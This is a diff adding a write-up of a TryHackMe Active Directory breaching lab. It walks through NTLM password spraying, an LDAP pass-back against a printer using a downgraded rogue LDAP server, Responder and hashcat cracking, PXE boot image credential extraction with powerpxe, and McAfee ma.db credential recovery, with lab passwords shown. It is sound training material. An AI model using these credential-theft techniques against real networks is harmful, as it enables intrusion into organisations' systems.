@@ -60,78 +60,356 @@ Navigating to the URL, we can see that it prompts us for Windows Authentication 
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5f18e5326d5a50d656d1827221bdcac7.png)
 
-\
+We use the provided script to bruteforce the login and got 4 valid logons.
 
+Or create your own bruteforcer using the [Ntlm\_python\_module](https://pypi.org/project/requests-ntlm/)
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
+```
+{% endcode %}
 
+<figure><img src=".gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>
 
+I drafted a test script:
 
+{% code overflow="wrap" lineNumbers="true" %}
+```python
+import requests
+from requests_ntlm import HttpNtlmAuth
 
+url = "http://ntlmauth.za.tryhackme.com/"
+fqdn = "za.tryhackme.com"
+username = "hollie.powell"
+password = "Chagngeme123"
 
+req = requests.get(url, auth=HttpNtlmAuth(f"{fqdn}\\{username}", f"{password}"))
 
+print(req.status_code)
+print(req.text)
+```
+{% endcode %}
 
+### LDAP Bind Credentials
 
+Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. LDAP authentication is similar to NTLM authentication. However, with LDAP authentication, the application directly verifies the user's credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials.
 
+LDAP authentication is a popular mechanism with third-party (non-Microsoft) applications that integrate with AD. These include applications and systems such as:
 
+* Gitlab
+* Jenkins
+* Custom-developed web applications
+* Printers
+* VPNs
 
+If any of these applications or services are exposed on the internet, the same type of attacks as those leveraged against NTLM authenticated systems can be used. However, since a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues. In essence, we can attempt to recover the AD credentials used by the service to gain authenticated access to AD. The process of authentication through LDAP is shown below:
 
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d2f78ae2b44ef76453a80144dac86b4e.png)\
 
 
+If you could gain a foothold on the correct host, such as a Gitlab server, it might be as simple as reading the configuration files to recover these AD credentials. These credentials are often stored in plain text in configuration files since the security model relies on keeping the location and storage configuration file secure rather than its contents. Configuration files are covered in more depth in Task 7.
 
+### LDAP Pass-back Attacks
 
+However, one other very interesting attack can be performed against LDAP authentication mechanisms, called an LDAP Pass-back attack. This is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom.
 
+LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as `admin:admin` or `admin:password`. Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.
 
+#### Performing an LDAP Pass-back
 
+There is a network printer in this network where the administration website does not even require credentials. Navigate to [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx) to find the settings page of the printer:
 
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b2ab520a2601299ed9bf74d50168ca7d.png)
 
+Using browser inspection, we can also verify that the printer website was at least secure enough to not just send the LDAP password back to the browser:
 
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c7cfe0419d3ebe9534d4caefcd1a5511.png)
 
+So we have the username, but not the password. However, when we press test settings, we can see that an authentication request is made to the domain controller to test the LDAP credentials. Let's try to exploit this to get the printer to connect to us instead, which would disclose the credentials. To do this, let's use a simple Netcat listener to test if we can get the printer to connect to us. Since the default port of LDAP is 389, we can use the following command:
 
+```
+nc -lvp 389
+```
 
+We use our "breachad" ip address, and we click "test settings" and get a connection.
 
+<figure><img src=".gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>
 
+The `supportedCapabilities`response tells us we have a problem. Essentially, before the printer sends over the credentials, it is trying to negotiate the LDAP authentication method details. It will use this negotiation to select the most secure authentication method that both the printer and the LDAP server support. If the authentication method is too secure, the credentials will not be transmitted in cleartext. With some authentication methods, the credentials will not be transmitted over the network at all! So we can't just use normal Netcat to harvest the credentials. We will need to create a rogue LDAP server and configure it insecurely to ensure the credentials are sent in plaintext.
 
+### Hosting a Rogue LDAP Server
 
+There are several ways to host a rogue LDAP server, but we will use OpenLDAP for this. Install OpenLDAP using the following command:
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
+```
+{% endcode %}
 
+We will start by reconfiguring the LDAP server using the following command:
 
+```
+sudo dpkg-reconfigure -p low slapd
+```
 
+Make sure to press \<No> when requested if you want to skip server configuration:
 
+<figure><img src=".gitbook/assets/image (136).png" alt=""><figcaption><p>1</p></figcaption></figure>
 
+For the DNS domain name, you want to provide our target domain, which is `za.tryhackme.com`:
 
+<figure><img src=".gitbook/assets/image (137).png" alt=""><figcaption><p>2</p></figcaption></figure>
 
+Use this same name for the Organisation name as well:
 
+![3](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c4bef0c3f054c32ca982ee9c1608ba1b.png)
 
+Provide any Administrator passwor
 
+Select MDB as the LDAP database to use:
 
+![5](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/07af572567aa32e0e0be2b4d9f54b89a.png)
 
+For the last two options, ensure the database is not removed when purged:
 
+![6](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4d5086da7b25a6f218d6eebdab6d3b71.png)
 
+Move old database files before a new one is created:
 
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d383582606e776eb901650ac9799cef5.png" alt=""><figcaption><p>7</p></figcaption></figure>
 
+Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif file, called with the following content:
 
+olcSaslSecProps.ldif
 
+```shell-session
+#olcSaslSecProps.ldif
+dn: cn=config
+replace: olcSaslSecProps
+olcSaslSecProps: noanonymous,minssf=0,passcred
+```
 
+The file has the following properties:
 
+* olcSaslSecProps: Specifies the SASL security properties
+* noanonymous: Disables mechanisms that support anonymous login
+* minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.
 
+Now we can use the ldif file to patch our LDAP server using the following:
 
+`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`
 
+We can verify that our rogue LDAP server's configuration has been applied using the following command (Note: If you are using Kali, you may not receive any output, however the configuration should have worked and you can continue with the next steps):LDAP search to verify supported authentication mechanisms.
 
+<figure><img src=".gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>
 
+### Capturing LDAP Credentials
 
+Our rogue LDAP server has now been configured. When we click the "Test Settings" at [http://printer.za.tryhackme.com/settings.aspx](http://printer.za.tryhackme.com/settings.aspx), the authentication will occur in clear text. If you configured your rogue LDAP server correctly and it is downgrading the communication, you will receive the following error: "This distinguished name contains invalid syntax". If you receive this error, you can use a tcpdump to capture the credentials using the following command:
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+sudo tcpdump -SX -i breachad tcp port 389
+```
+{% endcode %}
 
+<figure><img src=".gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>
 
+## Authentication Relay
 
+Continuing with attacks that can be staged from our rogue device, we will now look at attacks against broader network authentication protocols. In Windows networks, there are a significant amount of services talking to each other, allowing users to make use of the services provided by the network.
 
+These services have to use built-in authentication methods to verify the identity of incoming connections. In Task 2, we explored NTLM Authentication used on a web application. In this task, we will dive a bit deeper to look at how this authentication looks from the network's perspective. However, for this task, we will focus on NetNTLM authentication used by SMB.
 
+### SMB (server message block)
 
+The Server Message Block (SMB) protocol allows clients (like workstations) to communicate with a server (like a file share). In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration. Even the "out of paper" alert your computer receives when you try to print a document is the work of the SMB protocol.
 
+However, the security of earlier versions of the SMB protocol was deemed insufficient. Several vulnerabilities and exploits were discovered that could be leveraged to recover credentials or even gain code execution on devices. Although some of these vulnerabilities were resolved in newer versions of the protocol, often organisations do not enforce the use of more recent versions since legacy systems do not support them. We will be looking at two different exploits for NetNTLM authentication with SMB:
 
+* Since the NTLM Challenges can be intercepted, we can use offline cracking techniques to recover the password associated with the NTLM Challenge. However, this cracking process is significantly slower than cracking NTLM hashes directly.
+* We can use our rogue device to stage a man in the middle attack, relaying the SMB authentication between the client and server, which will provide us with an active authenticated session and access to the target server.
 
+### LLMNR, NBT-NS, and WPAD
 
+We will use Responder to attempt to intercept the NetNTLM challenge to crack it.
 
+`sudo responder -I breachad` - start responder.
 
+<figure><img src=".gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>
 
+`hashcat -m 5600 ntlm_hash passwordlist.txt --force` - crack with hashcat.
 
+<figure><img src=".gitbook/assets/image (141).png" alt=""><figcaption><p>cracked</p></figcaption></figure>
+
+### Microsoft Deployment Toolkit
+
+#### MDT and SCCM
+
+Microsoft Deployment Toolkit (MDT) is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS). Large organisations use services such as MDT to help deploy new images in their estate more efficiently since the base images can be maintained and updated in a central location.
+
+Usually, MDT is integrated with Microsoft's System Center Configuration Manager (SCCM), which manages all updates for all Microsoft applications, services, and operating systems. MDT is used for new deployments. Essentially it allows the IT team to preconfigure and manage boot images. Hence, if they need to configure a new machine, they just need to plug in a network cable, and everything happens automatically. They can make various changes to the boot image, such as already installing default software like Office365 and the organisation's anti-virus of choice. It can also ensure that the new build is updated the first time the installation runs.
+
+SCCM can be seen as almost an expansion and the big brother to MDT. What happens to the software after it is installed? Well, SCCM does this type of patch management. It allows the IT team to review available updates to all software installed across the estate. The team can also test these patches in a sandbox environment to ensure they are stable before centrally deploying them to all domain-joined machines. It makes the life of the IT team significantly easier.
+
+However, anything that provides central management of infrastructure such as MDT and SCCM can also be targetted by attackers in an attempt to take over large portions of critical functions in the estate. Although MDT can be configured in various ways, for this task, we will focus exclusively on a configuration called Preboot Execution Environment (PXE) boot.
+
+#### PXE Boot
+
+Large organisations use PXE boot to allow new devices that are connected to the network to load and install the OS directly over a network connection. MDT can be used to create, manage, and host PXE boot images. PXE boot is usually integrated with DHCP, which means that if DHCP assigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process. The communication flow is shown in the diagram below:
+
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png" alt=""><figcaption></figcaption></figure>
+
+Once the process is performed, the client will use a TFTP connection to download the PXE boot image. We can exploit the PXE boot image for two different purposes.
+
+* Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
+* Perform password scraping attacks to recover AD credentials used during the install.
+
+In this task, we will focus on the latter. We will attempt to recover the deployment service account associated with the MDT service during installation for this password scraping attack. Furthermore, there is also the possibility of retrieving other AD accounts used for the unattended installation of applications and services.
+
+### PXE Boot Image Retrieval
+
+Since DHCP is a bit finicky, we will bypass the initial steps of this attack. We will skip the part where we attempt to request an IP and the PXE boot preconfigure details from DHCP. We will perform the rest of the attack from this step in the process manually.
+
+The first piece of information regarding the PXE Boot preconfigure you would have received via DHCP is the IP of the MDT server. In our case, you can recover that information from the TryHackMe network diagram.
+
+The second piece of information you would have received was the names of the BCD files. These files store the information relevant to PXE Boots for the different types of architecture. To retrieve this information, you will need to connect to this website: [http://pxeboot.za.tryhackme.com](http://pxeboot.za.tryhackme.com/). It will list various BCD files:
+
+![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/63264e3ddce1a8b438a7c8b6d527688c.png)
+
+Usually, you would use TFTP to request each of these BCD files and enumerate the configuration for all of them. However, in the interest of time, we will focus on the BCD file of the x64 architecture. Copy and store the full name of this file. For the rest of this exercise, we will be using this name placeholder `x64{7B...B3}.bcd` since the files and their names are regenerated by MDT every day. Each time you see this placeholder, remember to replace it with your specific BCD filename. Note as well that if the network has just started, these file names will only update after 10 mintes of the network being active.
+
+With this initial information now recovered from DHCP (wink wink), we can enumerate and retrieve the PXE Boot image. We will be using our SSH connection on THMJMP1 for the next couple of steps, so please authenticate to this SSH session using the following:
+
+`ssh thm@THMJMP1.za.tryhackme.com`
+
+and the password of `Password1@`.
+
+To ensure that all users of the network can use SSH, start by creating a folder with your username and copying the powerpxe repo into this folder:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+C:\Users\THM>cd Documents
+C:\Users\THM\Documents> mkdir <username>
+C:\Users\THM\Documents> copy C:\powerpxe <username>\
+C:\Users\THM\Documents\> cd <username>
+```
+{% endcode %}
+
+The first step we need to perform is using TFTP and downloading our BCD file to read the configuration of the MDT server. TFTP is a bit trickier than FTP since we can't list files. Instead, we send a file request, and the server will connect back to us via UDP to transfer the file. Hence, we need to be accurate when specifying files and file paths. The BCD files are always located in the /Tmp/ directory on the MDT server. We can initiate the TFTP transfer using the following command in our SSH session:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+tftp -i 10.200.26.202 GET "\Tmp\x64{9EF95547-1FF6-46B5-9972-4DECD9501706}.bcd" c
+onf.bcd
+```
+{% endcode %}
+
+You will have to lookup THMMDT IP with `nslookup thmmdt.za.tryhackme.com`. With the BCD file now recovered, we will be using [powerpxe](https://github.com/wavestone-cdt/powerpxe) to read its contents. Powerpxe is a PowerShell script that automatically performs this type of attack but usually with varying results, so it is better to perform a manual approach. We will use the Get-WimFile function of powerpxe to recover the locations of the PXE Boot images from the BCD file:
+
+<figure><img src=".gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.   
+
+PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
+PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
+PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
+>> Parse the BCD file: conf.bcd
+>>>> Identify wim file : <PXE Boot Image Location>
+<PXE Boot Image Location>
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>
+
+WIM files are bootable images in the Windows Imaging Format (WIM). Now that we have the location of the PXE Boot image, we can again use TFTP to download this image:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
+Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
+```
+{% endcode %}
+
+This download will take a while since you are downloading a fully bootable and configured Windows image. Maybe stretch your legs and grab a glass of water while you wait.
+
+`tftp -i 10.200.26.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim` .
+
+<figure><img src=".gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>
+
+#### Recovering Credentials from a PXE Boot Image
+
+Now that we have recovered the PXE Boot image, we can exfiltrate stored credentials. It should be noted that there are various attacks that we could stage. We could inject a local administrator user, so we have admin access as soon as the image boots, we could install the image to have a domain-joined machine. If you are interested in learning more about these attacks, you can read this [article](https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/). This exercise will focus on a simple attack of just attempting to exfiltrate credentials.
+
+Again we will use powerpxe to recover the credentials, but you could also do this step manually by extracting the image and looking for the bootstrap.ini file, where these types of credentials are often stored. To use powerpxe to recover the credentials from the bootstrap file, run the following command:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
+>> Open pxeboot.wim
+>>>> Finding Bootstrap.ini
+>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
+>>>> >>>> UserID = <account>
+>>>> >>>> UserDomain = ZA
+>>>> >>>> UserPassword = <password>
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (133).png" alt=""><figcaption><p>we got the credentials</p></figcaption></figure>
+
+As you can see, powerpxe was able to recover the AD credentials. We now have another set of AD credentials that we can use!
+
+### Configuration Files
+
+Suppose you were lucky enough to cause a breach that gave you access to a host on the organisation's network. In that case, configuration files are an excellent avenue to explore in an attempt to recover AD credentials. Depending on the host that was breached, various configuration files may be of value for enumeration:&#x20;
+
+* Web application config files
+* Service configuration files
+* Registry keys
+* Centrally deployed applications
+
+Several enumeration scripts, such as [Seatbelt](https://github.com/GhostPack/Seatbelt), can be used to automate this process.
+
+However, we will focus on recovering credentials from a centrally deployed application in this task. Usually, these applications need a method to authenticate to the domain during both the installation and execution phases. An example of such as application is McAfee Enterprise Endpoint Security, which organisations can use as the endpoint detection and response tool for security.
+
+McAfee embeds the credentials used during installation to connect back to the orchestrator in a file called ma.db. This database file can be retrieved and read with local access to the host to recover the associated AD service account. We will be using the SSH access on THMJMP1 again for this exercise.
+
+The ma.db file is stored in a fixed location:
+
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+thm@THMJMP1 C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB
+thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
+ Volume in drive C is Windows 10
+ Volume Serial Number is 6A0F-AA0F
+
+ Directory of C:\ProgramData\McAfee\Agent\DB      
+
+03/05/2022  10:03 AM    <DIR>          .
+03/05/2022  10:03 AM    <DIR>          ..
+03/05/2022  10:03 AM           120,832 ma.db      
+               1 File(s)        120,832 bytes     
+               2 Dir(s)  39,426,285,568 bytes free
+```
+{% endcode %}
+
+We can use SCP to copy the ma.db to our AttackBox:
+
+`scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .` - on kali.
+
+To read the database file, we will use a tool called sqlitebrowser. We can open the database using the following command:
+
+`sqlitebrowser ma.db` -&#x20;
+
+Using sqlitebrowser, we will select the Browse Data option and focus on the AGENT\_REPOSITORIES table:
+
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/aeda85be24462cc6a3f0c03cd899053a.png" alt=""><figcaption></figcaption></figure>
+
+We are particularly interested in the second entry focusing on the DOMAIN, AUTH\_USER, and AUTH\_PASSWD field entries. Make a note of the values stored in these entries. However, the AUTH\_PASSWD field is encrypted. Luckily, McAfee encrypts this field with a known key. Therefore, we will use the given script to decrypt the password.
 
